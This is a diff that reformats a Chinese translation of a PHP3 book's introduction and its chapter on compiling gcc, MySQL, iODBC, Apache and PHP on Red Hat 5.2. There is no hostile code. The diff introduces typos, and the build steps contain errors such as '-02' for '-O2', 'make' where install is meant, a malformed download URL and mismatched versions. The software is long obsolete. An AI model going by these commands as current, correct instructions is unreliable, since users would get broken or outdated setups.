@@ -1,38 +1,11 @@
+
 # PHP3：使用 PHP 编程浏览器应用开发
-
-
-
-
-
-
-
-![](img/60cf9e8f697416e18e3ca18e3d4f7f4e_0_0.png)
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 本书的赞编辑是 Simon Yates，制作主管是 Clare Stanley。由 TIPS Technical Publishing 使用 Sabon 字体排版。
 
-
-
-
-
 献给我的妻子 Kathryn
 
-
-- 引言 xiii
-
-# 引言
+## 引言
 
 这本书和我所有的书一样，基于“在做中学习”的原则，因为我相信仅仅阅读某个主题并不是最好的学习方法。毕竟，你不是通过阅读来学习拼图的，而是亲手去拼。你必须实际运行一些程序才能真正理解这些概念。
 
@@ -42,34 +15,31 @@ PHP 展示了如何有机地创建应用程序。在书中，你从简单的程�
 
 穿插在书中的间歇章节应该会吸引硬核程序员。间歇章节的目标是展示代码的使用，即使所有使用的函数都没有在章节正文中得到详细解释。
 
-# 谁应该使用这本书？
+## 谁应该使用这本书？
 
 如果你是编程初学者，这本书非常适合你。第 4 章和第 5 章提供了 PHP 语言的介绍。第 7 章提供了数据库的介绍。读完这些章节后，可以从其余部分中自由选择——你的知识基础将足以理解我们在书中涵盖的其他话题。
 
 经验丰富的程序员将想要关注更复杂的章节。例如，第 9 章涵盖了模式匹配，这经常让即使是高级程序员也感到困惑。
 
-
-
-
 本书采用的方法旨在服务从初学者到高级者的广泛读者。如果你以前从未学过编程，这种“在做中学”的方法将帮助你快速、轻松地读完本书。如果你有编程经验，你将发现大量的材料可以完善和增强已有的知识，并让你对 PHP 的工作原理有坚实的理解。
 
-## 我需要什么？
+### 我需要什么？
 
 你需要一台运行 Linux 的计算机；其他所有内容都可以在书中附的 CD-ROM 中找到。
 
-## 如何使用本书
+### 如何使用本书
 
 你有几种方法来使用这本书。一种显而易见的方法是从第一页开始，按顺序一直读到最后一页。大多数初学者可能都想使用这种方法，本书的设计也特别确保了每一章都建立在前一章的基础上。或者，你也可以关注某些章节，并在遇到不熟悉的概念时跳回技术性章节。
 
 > 提示：在开始任何重大项目之前，至少通读一遍 PHP 函数列表（附录 D）是至关重要的。否则，你可能会花费几个小时去开发一个已经存在的函数。
 
-## 代码列表
+### 代码列表
 
 许多读者倾向于手写大部分示例代码；这有助于一次关注某一行代码。另一种好方法是完成章节中的一个示例，合上书，凭记忆手动输入。你经历的挣扎有助于加深理解。记住，迷路可以帮助你学会找到自己的路。
 
 如果你很懒、打字慢，或者像我的一些朋友那样容易手腕疼痛，可以从书中附的 CD-ROM 中复制列表。CD-ROM 上的每个列表都有这样的列表头：
 
-# **Listing 0.1** example.php——这是一个示例列表头
+`# Listing 0.1` example.php——这是一个示例列表头
 
 ```
 // This is a sample program line.
@@ -77,9 +47,7 @@ PHP 展示了如何有机地创建应用程序。在书中，你从简单的程�
 
 在每个示例之后，做一些实验并看看发生了什么。改变几个地方，或者添加几个，并稍微修改代码。这将帮助你更愉快地享受学习过程。成功的学习体验最重要的属性是乐趣。如果很有趣且你喜欢它，你就会坚持得更久。
 
-## 
-
-本书使用了以下约定：
+### 本书使用了以下约定：
 
 - 代码行、函数、变量名以及你在屏幕上看到的任何文本都使用特殊的 `monospace`（等宽字体）。
 - 文件名也设置为 `monospace` 字体。
@@ -109,26 +77,24 @@ PHP 展示了如何有机地创建应用程序。在书中，你从简单的程�
 
 接下来的几章回到更多的教学模式。第 12 章“什么是 CGI?”查看了 Web 服务器与响应 Web 浏览器请求而执行的程序之间的基础。即使 PHP（在书中）是 Apache Web 服务器不可的一部分，它也遵循 CGI 规则。
 
-第 13 章“身份验证”展示了如何更好地了解 Web 访问者。涵盖了使用用户 ID 和密码挑战用户的可用技术。
+第 13 章“身份验证”展示了如何更好地了解 Web 访问者。涵盖了使用用户 ID 和密度挑战用户的可用技术。
 
 第 14 章“真实世界的 SQL”更深入地讨论了 SQL。涵盖了表之间深层的关系以及引用完整性概念。第 15 章“间歇四：管理并发访问”使用 PHPLIB 模块验证用户，并防止多个用户同时更改记录。
 
 第 16 章和第 17 章查看 XML。首先，第 16 章“XML”提供了对 PHP 的描述、它如何集成到 Apache Web 服务器中，以及它可以执行哪些任务。第 17 章“处理 XML”展示了如何解析 XML 标签。
 
-
-
--   **服务端**——由于 PHP 运行在 Web 服务器上，因此 PHP 程序可以很大且复杂，而不会减慢客户端的速度。
--   **跨平台**——PHP 程序可以在 UNIX、Linux 或 Windows 计算机上运行，尽管本书主要侧重于 Linux。
--   **嵌入 HTML**——由于 PHP 语言嵌入在 HTML 中，因此它很容易学习。
--   **语言简单**——与 Java 或 C++ 不同，PHP 语言坚持基础，但它又足够强大，可以支持任何规模的网站。
--   **效率**——与其他解释型语言相比，PHP 消耗的系统资源非常少。作为 Apache 服务器的一部分构建时，代码的执行不需要调用外部二进制文件——服务器解释脚本时没有额外开销。
--   **XML 解析**——你可以构建一个可以读取 XML 信息的 PHP 版本。
--   **数据库模块**——你可以使用 PHP 访问 Oracle、Sybase、MS SQL、ADabase、MySQL, PostgreSQL、dBase, FilePro, Solid, Unix dbm, Informix/Illustra 以及任何支持 ODBC 标准的数据库。
--   **文件 I/O**——PHP 有许多函数来处理任何文件处理需求。
--   **文本处理**——PHP 有许多函数来处理文本，包括模式匹配的能力。
--   **复杂变量**——PHP 支持标量、数组和关联数组变量。这为你提供了支持高级数据结构的坚实基础。
--   **图像处理**——你可以使用 PHP 动态创建图像。
--   **还有更多！**
+- **服务端**——由于 PHP 运行在 Web 服务器上，因此 PHP 程序可以很大且复杂，而不会减慢客户端的速度。
+- **跨平台**——PHP 程序可以在 UNIX、Linux 或 Windows 计算机上运行，尽管本书主要侧重于 Linux。
+- **嵌入 HTML**——由于 PHP 语言嵌入在 HTML 中，因此它很容易学习。
+- **语言简单**——与 Java 或 C++ 不同，PHP 语言坚持基础，但它又足够强大，可以支持任何规模的网站。
+- **效率**——与其他解释型语言相比，PHP 消耗的系统资源非常少。作为 Apache 服务器的一部分构建时，代码的执行不需要调用外部二进制文件——服务器解释脚本时没有额外开销。
+- **XML 解析**——你可以构建一个可以读取 XML 信息的 PHP 版本。
+- **数据库模块**——你可以使用 PHP 访问 Oracle、Sybase、MS SQL、ADabase、MySQL, PostgreSQL、dBase, FilePro, Solid, Unix dbm, Informix/Illustra 以及任何支持 ODBC 标准的数据库。
+- **文件 I/O**——PHP 有许多函数来处理任何文件处理需求。
+- **文本处理**——PHP 有许多函数来处理文本，包括模式匹配的能力。
+- **复杂变量**——PHP 支持标量、数组和关联数组变量。这为你提供了支持高级数据结构的坚实基础。
+- **图像处理**——你可以使用 PHP 动态创建图像。
+- **还有更多！**
 
 ## PHP 的费用昂多少？
 
@@ -140,7 +106,7 @@ GNU 通用公共许可证（GNU General Public License）是分发免费软件�
 
 ## PHP 语言嵌入在 HTML 中
 
-当使用“经典”语言（如 C 或 Pascal）进行编程时，所有的源代码都会编译成一个可执行文件。然后运行该可执行文件为远程 Web 浏览器生成 HTML 标签。相反，PHP 不需要编译（至少不编译成可执行文件）。你可以将 PHP 代码与 HTML 混合。例如，以下代码显示了“Hello, world!”。代码以粗体形式显示。
+当使用“经典”语言（如 C 或 Pascal）进行编程时，所有的源代码都会编译成一个可执行文件。然后运行该可执文件为远程 Web 浏览器生成 HTML 标签。相反，PHP 不需要编译（至少不编译成可执行文件）。你可以将 PHP 代码与 HTML 混合。例如，以下代码显示了“Hello, world!”。代码以粗体形式显示。
 
 ```html
 <HTML>
@@ -170,6 +136,7 @@ PHP 代码生成的任何输出都会替换生成它的 <?PHP ... ?> 标签。�
 ```
 
 注意，所有的 PHP 代码都消失了，只剩下 HTML。
+
 由 PHP 代码产生的 HTML 以粗体显示。
 
 ## PHP 语言在 Web 服务器上执行
@@ -209,12 +176,9 @@ PHP 程序与 C 有相似之处，因为 PHP 是源自 C。PHP 可用的功能�
 - libiodbc——主要用于访问非 UNIX 计算机数据库的 ODBC 函数库
 - MyODBC——连接 PHP、iODBC 和 MySQL 的接口库
 
-尽管本章确实提到了编译应用程序所需的命令，但只对它们进行了简要描述。毕竟，本书的重点是 PHP 语言而不是 C 语言。每个应用程序在我这里都顺利编译通过了，希望你也有同样的好运。如果你确实遇到了问题，可以在 IRC 频道中提问（请礼貌一点！）或者你可以尝试以下的
+尽管本章确实提到了编译应用程所需的命令，但只对它们进行了简要描述。毕竟，本书的重点是 PHP 语言而不是 C 语言。每个应用程序在我这里都顺利编译通过了，希望你也有同样的好运。如果你确实遇到了问题，可以在 IRC 频道中提问（请礼貌一点！）或者你可以尝试以下的
 
-
-
-
-## 基础概念
+### 基础概念
 
 如果你以前从未编译过 Linux 应用程序，你可能需要熟悉几个概念，以便在问题出现时你有机会对其进行诊断。
 
@@ -222,145 +186,96 @@ PHP 程序与 C 有相似之处，因为 PHP 是源自 C。PHP 可用的功能�
 
 在开始编译之前，让我们先讨论如何从错误中恢复。在获得有关问题的帮助后，使用以下命令重新初始化源目录：
 
-**rm config.cache**——几乎所有的 Linux 应用程序都使用一个名为 `configure` 的命令来检查你的系统，寻找有关如何定制编译过程的信息。检查的结果被存储在一个名为 `config.cache` 的文件中。通过删除此文件，你强制 `configure` 程序从头开始检查你的系统。
-
-**make distclean**——所有用 C 语言语言编写的 Linux 应用程序都是使用 `make` 程序进行编译的。`make` 程序查看每个源文件，并决定它是需要编译还是已经编译过了。
-
-**make distclean** 命令——“重置”所有源文件，以便它们可以重新编译。
-
-**make clean**——某些应用程序不支持 **make distclean** 命令；相反它们提供了 **make clean** 命令。**make clean** 命令也会“重置”源文件，以便它们可以重新编译。
+- `rm config.cache`——几乎所有的 Linux 应用程序都使用一个名为 `configure` 的命令来检查你的系统，寻找有关如何定制编译过程的信息。检查的结果被存储在一个名为 `config.cache` 的文件中。通过删除此文件，你强制 `configure` 程序从头开始检查你的系统。
+- `make distclean`——所有用 C 语言语言编写的 Linux 应用程序都是使用 `make` 程序进行编译的。`make` 程序查看每个源文件，并决定它是需要编译还是已经编译过了。
+- `make distclean` 命令——“重置”所有源文件，以便它们可以重新编译。
+- `make clean`——某些应用程序不支持 **make distclean** 命令；相反它们提供了 **make clean** 命令。**make clean** 命令也会“重置”源文件，以便它们可以重新编译。
 
 你正在安装的某些程序可能不支持这些命令中的每一个，但尝试它们并无害处。
 
 Red Hat v5.2 使用 glibc 库。如果你从互联网下载其他程序或你在本章中安装的程序的更新版本，你需要知道这一信息。你可以使用 `rpm -q glibc` 命令来查看你安装了哪个版本的 glibc 库。在你的系统中，此命令显示 `glibc-2.0.7.29`。
 
-注意
-
-## tar
+#### tar
 
 tar，或称为 tape archiver（磁带归档），将多个文件合并为一个，并可选地压缩文件以减小它们的大小。它最初是为了创建可以存储在磁带上的备份。当文件被压缩时，它们的扩展名为 .gz；否则，它们的扩展名为 .tar。
 
-## gcc
+#### gcc
 
 gcc 是来自 GNU 的 C 编译器。它的工作是将源文件文件（人类可读）编译成对象文件（机器可读）。C 源文件通常具有 .c 扩展名。对象文件通常具有 .o 扩展名。如果编译器无法工作，你就会遇到编译时错误或语法错误。大多数情况下，文件不完整是因为编译器无法找到一个或多个头文件。头文件具有 .h 扩展名，用于定义各种特定于系统的信息，并将用于多个 .c 文件的信息收集到一个位置中。
 
-## make
+#### make
 
 make 是一个辅助编译的实用程序。它的工作是仅编译那些尚未编译的源文件。编译 .c 文件会生成一个 .o 文件。如果 .c 文件比 .o 文件新——也就是说，自上次编译以来它被编辑过——那么 make 就会重新编译 .c 文件。make 通常查找 Makefile 并从中读取其指令。Makefile 可以包含一个或多个可以执行的目标。例如，`make clean` 告诉你你想执行 `clean` 目标。
 
-## ld
+#### ld
 
 ld 是来自 GNU 的链接器。它的工作是将所有的对象文件和库缝合在一起，以创建一个单一的可执行文件。希望你 永远都不需要手动运行此程序，因为 Makefile 将处理所有的编译细节。
 
-## ldconfig
+#### ldconfig
 
 ldconfig 在各种库目录（如 /etc/ld.so.conf 中指定的）中搜索被多个应用程序使用的共享库，这些库的文件名中包含 .so。例如，libqt.so.1.42 是一个共享库。在每次编译之后，你可能需要向 /etc/ld.so.conf 文件添加一个目录并运行 ldconfig -v 命令。
 
-## /configure
+#### /configure
 
 configure 搜索你的计算机以寻找关键信息，例如安装了哪种 C 编译器以及你的头文件位于何处。然后它根据需要修改 Makefile 以针对你的计算机配置。configure 几乎总是使用 `./` 执行，这样你可以从当前目录运行可执行文件，而不是意外地从位于你 $PATH 环境变量中的其他目录运行它。
 
-## 符号链接 (Symbolic Links)
+#### 符号链接 (Symbolic Links)
 
-符号链接允许你通过不同的名称引用一个现有文件。例如，你可能想将 libqt.so.1.42 为 libqt.so.1。符号链接本质上允许你将文件复制到不同的目录并命名，而无需真的执行复制操作。第二个指向第一个实例。你会发现使用符号链接至少有两个优势；第一个是符号链接占用的磁盘空间较少——可能只有 16 字节。第二个稍微微妙一点。假设你有一个名为 libqt.so.1 的符号链接指向 libqt.so.1.42。如果你需要升级到 libqt.so.1.88 怎么办？你是否可以更改符号链接使得 libqt.so.1 指向 libqt.so.1.88 而不是 libqt.so.1.42。这意味着引用 libqt.so.1.42 的程序自动开始使用库的新版本。按照惯，符号链接用于整数版本发布。也就是说，libqt.so.1.88 和 libqt.so.2.32 将具有不同的符号链接（分别为 libqt.so.1 和 libqt.so.2）。
+符号链允许你通过不同的名称引用一个现有文件。例如，你可能想将 libqt.so.1.42 为 libqt.so.1。符号链接本质上允许你将文件复制到不同的目录并命名，而无需真的执行复制操作。第二个指向第一个实例。你会发现使用符号链接至少有两个优势；第一个是符号链接占用的磁盘空间较少——可能只有 16 字节。第二个稍微微妙一点。假设你有一个名为 libqt.so.1 的符号链接指向 libqt.so.1.42。如果你需要升级到 libqt.so.1.88 怎么办？你是否可以更改符号链接使得 libqt.so.1 指向 libqt.so.1.88 而不是 libqt.so.1.42。这意味着引用 libqt.so.1.42 的程序自动开始使用库的新版本。按照惯，符号链接用于整数版本发布。也就是说，libqt.so.1.88 和 libqt.so.2.32 将具有不同的符号链接（分别为 libqt.so.1 和 libqt.so.2）。
 
-## 编译准备
+#### 编译准备
 
 以下步骤为你的系统编译做好准备：
 
 - 1. mkdir /usr/local —— 为你的系统安装应用程序做好准备。其他用户可能使用 /usr/local、/opt 或 /var。编译完成后你可以将其移动到 /usr/local。
-
-注意
-
-你需要 root 权限执行本章的操作。
-
 - 2. cd /usr/local —— 进入源目录。
-
 - 3. 下载以下文件（从 http://www.mt-com/php）：
-- apache_1.3.4.tar.gz
-- gcc-2.8.1.tar.gz
-- mysql-3.2.16.tar.gz
-- php-3.0.11.tar.gz
-- expat-2.tar.gz
-
+  - apache_1.3.4.tar.gz
+  - gcc-2.8.1.tar.gz
+  - mysql-3.2.16.tar.gz
+  - php-3.0.11.tar.gz
+  - expat-2.tar.gz
 - 4. 使用 tar 命令解压这些文件。x 选项告诉 tar 提取。v 选项告诉 tar 显示文件名。z 选项告诉 tar 解压缩。f 选项告诉 tar 你正在指定文件。
-
 - 5. gcc -v 确定你的系统当前具有哪个版本的 gcc。如果你没有 v2.7.2.3，请将下一步中的“2.7.2.3”替换为你当前的 gcc 版本。
-
-- 6. cp `gcc` /usr/bin/ —— 复制现有的可执行文件。Linux 的优势之一是你可以轻松地在你的目录中存储多个版本的程序。
-
+- 6. cp `gcc` /usr/bin/ —— 复制现有的可执文件。Linux 的优势之一是你可以轻松地在你的目录中存储多个版本的程序。
 - 复制现有的可执行文件以以便在以后需要时拥有它。
-
 - 7. httpd v 确定你的系统加载了哪个版本的 Apache。如果你没有 v1.3.4，请将下一步中的“1.3.4”替换为你当前的 Apache 版本。
-
 - 8. mv `which httpd` /usr/sbin/ —— 移动现有的可执行文件。
 
-## 编译 gcc，C 编译器
+### 编译 gcc，C 编译器
 
 你应该编译并安装的第一个程序是 C 编译器。Red Hat v5.2 自带的 C 编译器是 gcc v2.7.2.3，它并不足够正确编译 PHP。然而，gcc v2.7.2.3 可以编译 gcc v2.8.1，它是足够的。编译新版本的 gcc：
 
 - 1. cd /usr/local/src/gcc-2.8.1 进入 gcc 顶层目录。
-
 - 2. ./configure --prefix=/usr/local/gcc 运行配置程序并强制设置安装，使 gcc 安装到 /usr/local/gcc。
-
 - 3. make bootstrap LANGUAGES="c c++" BOOT_FLAGS="-g -02" 编译新的 C 和 C++ 编译器。
-
 - 4. make install LANGUAGES="c c++" BOOT_FLAGS="-g -02" 安装新的 C 和 C++ 编译器。
-
 - 5. mv /usr/local/gcc/bin/gcc /usr/local/gcc/bin/gcc-2.8.1 重命名新编译的 gcc 以包含版本号。
-
 - 6. ln -s /usr/local/gcc/bin/gcc-2.8.1 /usr/bin/gcc- 创建从 /usr/bin/gcc 指向新编译 gcc 可执行文件的符号链接。
+- 7. gcc -v 显示版本号。如果编译和安装成功，应该显示 v2.8.1。
 
-
-
-
-
-## 7. gcc -v
-
-显示版本号。如果编译和安装成功，应该显示 v2.8.1。
-
-## 编译 MySQL
+### 编译 MySQL
 
 现在是编译 MySQL 的时候了。编译完成后你你能够使用 MySQL 实用程序测试安装情况。
 
-- 1. cd /usr/local/src/mysql-3.22.16a-gamma
-连接到 MySQL 根目录。
+- 1. cd /usr/local/src/mysql-3.22.16a-gamma 连接到 MySQL 根目录。
+- 2. ./configure --prefix=/usr/local/mysql 运行配置程序并强制其设置安装路径，使 MySQL 安装到 /usr/local/mysql。
+- 3. make 编译 MySQL。
+- 4. make install 安装 MySQL。
+- 5. echo "/usr/local/mysql/lib/mysql" >> /etc/ld.so.conf 将 MySQL 库追加到 `ldconfig` 命令的配置文件。当 Linux 启动或运行 `ldconfig` 命令时，会搜索此配置文件中的目录（查找库文件）。
+- 6. ldconfig -v | grep libmysqlclient `ldconfig` 命令读取 `/etc/ld.so.conf` 中列出的目录并缓存找到的所有库。`grep` 在 `ldconfig` 命令的大量输出中搜索 MySQL 库，并将显示的文本限制为 `libmysqlclient.so.6 => lib-mysqlclient.so.6.o.o`。
+- 7. echo "/usr/local/mysql/bin/safe_mysqld > /dev/null 2>&1" >> /etc/rc.d/rc.local 将 MySQL 启动命令追加到 `/etc/rc.d/rc.local` 文件，以便 Linux 在 启动时自动启动。
 
-- 2. ./configure --prefix=/usr/local/mysql
-运行配置程序并强制其设置安装路径，使 MySQL 安装到 /usr/local/mysql。
+#### 测试 MySQL
 
-- 3. make
-编译 MySQL。
-
-- 4. make install
-安装 MySQL。
-
-- 5. echo "/usr/local/mysql/lib/mysql" >> /etc/ld.so.conf
-将 MySQL 库追加到 `ldconfig` 命令的配置文件。当 Linux 启动或运行 `ldconfig` 命令时，会搜索此配置文件中的目录（查找库文件）。
-
-- 6. ldconfig -v | grep libmysqlclient
-`ldconfig` 命令读取 `/etc/ld.so.conf` 中列出的目录并缓存找到的所有库。`grep` 在 `ldconfig` 命令的大量输出中搜索 MySQL 库，并将显示的文本限制为 `libmysqlclient.so.6 => lib-mysqlclient.so.6.o.o`。
-
-- 7. echo "/usr/local/mysql/bin/safe_mysqld > /dev/null 2>&1" >> /etc/rc.d/rc.local
-将 MySQL 启动命令追加到 `/etc/rc.d/rc.local` 文件，以便 Linux 在 启动时自动启动。
-
-## 测试 MySQL
-
-- 8. ./scripts/mysql_install_db
-初始化数据库。
-
-- 9. /usr/local/mysql/bin/safe_mysqld > /dev/null &
-将 MySQL 服务器作为后台进程启动。必须启动服务器才能测试安装情况。
-
+- 8. ./scripts/mysql_install_db 初始化数据库。
+- 9. /usr/local/mysql/bin/safe_mysqld > /dev/null & 将 MySQL 服务器作为后台进程启动。必须启动服务器才能测试安装情况。
 - 10. ln -s \
-/usr/local/mysql/bin/mysql \
-/usr/bin/mysql
-类似于从安装位置到 /usr/bin 目录创建符号链接。这种技术减少了环境变量 `PATH` 中的目录数量。它还隐藏了任何你不希望普通用户运行的 MySQL 实用程序（例如 `mysqladmin` 命令）。另一种技术是将命令 `PATH=$PATH:/usr/local/mysql/bin` 放入 `/etc/profile` 文件中。两种方法均可行。
-
+  /usr/local/mysql/bin/mysql \
+  /usr/bin/mysql 类似于从安装位置到 /usr/bin 目录创建符号链接。这种技术减少了环境变量 `PATH` 中的目录数量。它还隐藏了任何你不希望普通用户运行的 MySQL 实用程序（例如 `mysqladmin` 命令）。另一种技术是将命令 `PATH=$PATH:/usr/local/mysql/bin` 放入 `/etc/profile` 文件中。两种方法均可行。
 - 11. ln -s \
-/usr/local/mysql/bin/mysqlshow \
-/usr/bin/mysqlshow
-此命令允许普通用户运行 `mysqlshow` 命令。
+  /usr/local/mysql/bin/mysqlshow \
+  /usr/bin/mysqlshow 此命令允许普通用户运行 `mysqlshow` 命令。
 
 在继续编译 Apache 和 PHP 之前，请花时间测试你的 MySQL 安装情况。MySQL 分发版带了许多实用程序，但我们将只使用 `mysql` 和 `mysqlshow` 命令来测试它们。（如果你不熟悉数据库，不要担心。用户、表和记录等数据库概念将在第 6 章“数据库与 SQL”中介绍。）
 
@@ -372,23 +287,21 @@ configure 搜索你的计算机以寻找关键信息，例如安装了哪种 C �
 Ver 7.8 Distrib 3.22.16a-gamma, for pc-linux-gnu on 1686 TCX Datakonsult AB, by Monty
 ```
 
-# 第 02 章 / 安装 PHP
-
 服务器版本 3.22.16a-gamma
 协议版本 10
 通过 UNIX socket 连接 localhost
 UNIX socket /tmp/mysql.sock
 运行时间: 2 小时 30 分 39 秒
-
 线程: 1 问题: 7 慢查询: 0
 打开: 6 刷新表: 1 开启表: 2
 
 你可以使用此命令查看 `mysqladmin` 的所有功能：
+
 mysqladmin --help | less
 
 也许更有趣的实用程序是 `mysqlshow`，它显示数据库、表和字段的列表：
 
-## 表 2.1 mysqlshow—显示数据库、表和字段列表
+#### 表 2.1 mysqlshow—显示数据库、表和字段列表
 
 ```
 > PATH="/usr/local/mysql/bin:$PATH"
@@ -426,13 +339,15 @@ Database: mysql
 ```
 
 ```
+
 > # 当同时指定了数据库和表时，
 > # 显示该表的字段。
 ```
 
-## 测试 MySQL
+#### 测试 MySQL
 
 ```
+
 > mysqlpw -h mtolive.com -u root -p mysql user
 Enter password: password
 Database: mysql Table: user Rows: 5
@@ -455,7 +370,8 @@ Database: mysql Table: user Rows: 5
 | Grant | | | | | |
 | Index | | | | | |
 | Alter | | | | | |
-+------+----------------------+------+----+----++
++------+----------------------+------+----+++
+
 ```
 *(注：由于原文表格内容在 Markdown 中显示不完整或错位，此处根据逻辑进行了结构对齐处理)*
 
@@ -464,141 +380,81 @@ Database: mysql Table: user Rows: 5
 
 > 在生产模式下运行之前，请选择一个比 "password" 更好的密码！
 
-## 编译 iODBC 和 MyBC
+### 编译 iODBC 和 MyBC
 
 iODBC 是实现 ODBC 协议的函数库。主要用于连接运行在 Microsoft Windows 上的数据引擎。
 
-- 1. cd /usr/local/src/libiodbc-2.50.23
-连接到 iodbc 目录。
-
+- 1. cd /usr/local/src/libiodbc-2.50.23 连接到 iodbc 目录。
 - 2. ./configure \
 --prefix=/usr/local/iodbc \
 --with-odbc-inidir=/usr/local/etc
 运行配置程序并强制其设置安装路径，使 iODBC 安装到 /usr/local/iodbc。此外，确保 ODBC 初始化文件为 /etc/odbc.ini。
-
 - 3. make
-
 - 4. make install
 库文件拷贝到 /usr/local/iodbc/lib，头文件拷贝到 /usr/local/iodbc/include。
-
-- 5. cd /usr/local/src/myodbc-2.50.24
-连接到 myodbc 目录。
-
+- 5. cd /usr/local/src/myodbc-2.50.24 连接到 myodbc 目录。
 - 6. ./configure \
 --prefix=/usr/local/myodbc \
 --with-mysql-sources=/usr/local/src/mysql-3.22.16a-gamma \
 --with-odbc-ini=/etc/odbc.ini \
 --with-iodbc=/usr/local/iodbc
 运行 MyODBC 配置程序。
-
 - 7. make
-
 - 8. make install
 库文件拷贝到 /usr/local/myodbc/lib。
 
- 编译 PHP
+### 编译 PHP
 
 编译 PHP 比之前的应用程序更复杂，因为 PHP 实际上是 expat、Apache 和 PHP 的组合。
 
-
-
-
 本次编译的最终结果是一个内置了 PHP 的 Apache 版本。要编译 PHP，请使用以下命令：
 
-- 1. `cd /usr/local/src/expat`
-  进入 expat 目录。
-
-- 2. `make`
-  编译 expat 的源文件。
-
+- 1. `cd /usr/local/src/expat` 进入 expat 目录。
+- 2. `make` 编译 expat 的源文件。
 - 3. 将以下行追加到 Makefile 文件中。确保在输入 `ar` 和 `ranlib` 所在之前使用了 Tab 键。
 ```
 libexpat.a: $(OBJS)
 ar -rc $(OBJS)
 ranlib $@
 ```
+- 4. `make libexpat.a` 将 expat 对象文件组合成库文件。
+- 5. `mv libexpat.a /usr/local/lib` PHP 配置程序会 fact在 /usr/local/lib 目录中查找 libexpat.a 文件。将文件移动到已知位置可以避免日后出现很多麻烦。
+- 6. `cd /usr/local/src/php-3.0.11` 进入 PHP 顶层目录。
+- 7. `mkdir /usr/local/include/xml` 确保 /usr/local/include/xml 目录存在。
+- 8. `ln -s /usr/local/src/expat/xmltok.h /usr/local/include/xmltok.h` 既然可以创建符号链接，为什么要复制呢？
+- 9. `ln -s /usr/local/src/expat/xmlparse.h /usr/local/include/xmlparse.h` 这是 PHP 正确编译时需要的另一个头文件。
 
-- 4. `make libexpat.a`
-  将 expat 对象文件组合成库文件。
+### 编译 PHP
 
-- 5. `mv libexpat.a /usr/local/lib`
-  PHP 配置程序会 fact在 /usr/local/lib 目录中查找 libexpat.a 文件。将文件移动到已知位置可以避免日后出现很多麻烦。
-
-- 6. `cd /usr/local/src/php-3.0.11`
-  进入 PHP 顶层目录。
-
-- 7. `mkdir /usr/local/include/xml`
-  确保 /usr/local/include/xml 目录存在。
-
-- 8. `ln -s /usr/local/src/expat/xmltok.h /usr/local/include/xmltok.h`
-  既然可以创建符号链接，为什么要复制呢？
-
-- 9. `ln -s /usr/local/src/expat/xmlparse.h /usr/local/include/xmlparse.h`
-  这是 PHP 正确编译时需要的另一个头文件。
-
-## 编译 PHP
-
-- 10. `cd /usr/local/src/apache_1.3.4`
-  进入 Apache 顶层目录。
-
-- 11. `./configure --prefix=/usr/local/apache`
-  运行配置程序并强制设置安装路径，使 Apache 安装到 /usr/local/apache。
-
-- 12. `cd /usr/local/src/php-3.0.11`
-  进入 PHP 顶层目录。
-
-- 13. `./configure --with-apache=../apache_1.3.4 --with-odbc=/usr/local/odbc --with-mysql=/usr/local/mysql --with-xml`
-  运行配置程序并告诉它包含对 Apache、MySQL 和 XML 支持。
-
-- 14. `make`
-  编译 PHP 源文件。
-
-- 15. `make`
-  安装编译后的文件。PHP 库被放置在 Apache 模块目录，以便在编译 Apache 时可以找到它。
-
-- 16. `cd /usr/local/src/apache_1.3.4`
-  进入 Apache 顶层目录。
-
-- 17. `./configure --prefix=/usr/local/apache --enable-module=src/modules/php3.so`
-  再次配置 Apache。这次告诉 Apache 加载 PHP 模块。
-
-- 18. `make`
-  编译 Apache 源文件。
-
-- 19. `make install`
-  安装编译后的文件。
-
-- 20. `mv /usr/local/apache/bin/httpd /usr/local/apache/bin/httpd-1.3.4`
-  重命名新创建的 httpd 可执行文件，以便安装多个版本。
-
-- 21. `ln -s /usr/local/apache/bin/httpd-1.3.4 /usr/sbin/httpd`
-  为新可执行文件创建符号链接。
-
-- 22. `httpd -v`
-  验证你是否可以访问新的可执行文件。该命令的结果应反映版本 1.3.4，且构建日期应该是正确的。
-
+- 10. `cd /usr/local/src/apache_1.3.4` 进入 Apache 顶层目录。
+- 11. `./configure --prefix=/usr/local/apache` 运行配置程序并强制设置安装路径，使 Apache 安装到 /usr/local/apache。
+- 12. `cd /usr/local/src/php-3.0.11` 进入 PHP 顶层目录。
+- 13. `./configure --with-apache=../apache_1.3.4 --with-odbc=/usr/local/odbc --with-mysql=/usr/local/mysql --with-xml` 运行配置程序并告诉它包含对 Apache、MySQL 和 XML 支持。
+- 14. `make` 编译 PHP 源文件。
+- 15. `make` 安装编译后的文件。PHP 库被放置在 Apache 模块目录，以便在编译 Apache 时可以找到它。
+- 16. `cd /usr/local/src/apache_1.3.4` 进入 Apache 顶层目录。
+- 17. `./configure --prefix=/usr/local/apache --enable-module=src/modules/php3.so` 再次配置 Apache。这次告诉 Apache 加载 PHP 模块。
+- 18. `make` 编译 Apache 源文件。
+- 19. `make install` 安装编译后的文件。
+- 20. `mv /usr/local/apache/bin/httpd /usr/local/apache/bin/httpd-1.3.4` 重命名新创建的 httpd 可执行文件，以便安装多个版本。
+- 21. `ln -s /usr/local/apache/bin/httpd-1.3.4 /usr/sbin/httpd` 为新可执行文件创建符号链接。
+- 22. `httpd -v` 验证你是否可以访问新的可执行文件。该命令的结果应反映版本 1.3.4，且构建日期应该是正确的。
 - 23. 编辑 `/usr/local/apache/conf/httpd.conf` 文件。搜索 AddType 并确保以下行未被注释：
   AddType application/x-httpd-php .html
   AddType application/x-httpd-php .php
   AddType application/x-httpd-php-source .php
-
 - 24. 继续编辑 `/usr/local/apache/conf/httpd.conf` 文件。搜索 DirectoryIndex 行末尾添加 index.php。
-
 - 25. 创建名为 `/usr/local/lib/php3.ini` 的文件，包含以下行：
   include_path=.:usr/local/apache/php/
   auto_prepend_file=/usr/local/apache/php/prepend.php
   track_vars = on
   magic_quotes_gpc = on
   sendmail_path /usr/sbin/sendmail -t
+- 26. `ln -s /usr/local/src/php-3.0.11/doc/manual.html /usr/local/src/php-3.0.11/doc/index.html` 创建符号链接，以便大多数 浏览器自动显示 PHP 文档的正确首页。
 
-- 26. `ln -s /usr/local/src/php-3.0.11/doc/manual.html /usr/local/src/php-3.0.11/doc/index.html`
-  创建符号链接，以便大多数 浏览器自动显示 PHP 文档的正确首页。
+### 安装 PHPLIB
 
-## 安装 PHPLIB
-
-- 27. `ln -s /usr/local/src/php-3.0.11/doc /usr/local/apache/htdocs/phpdocs`
-  创建符号链接，以便通过 http://localhost/phpdocs/ 访问 PHP 文档。
-
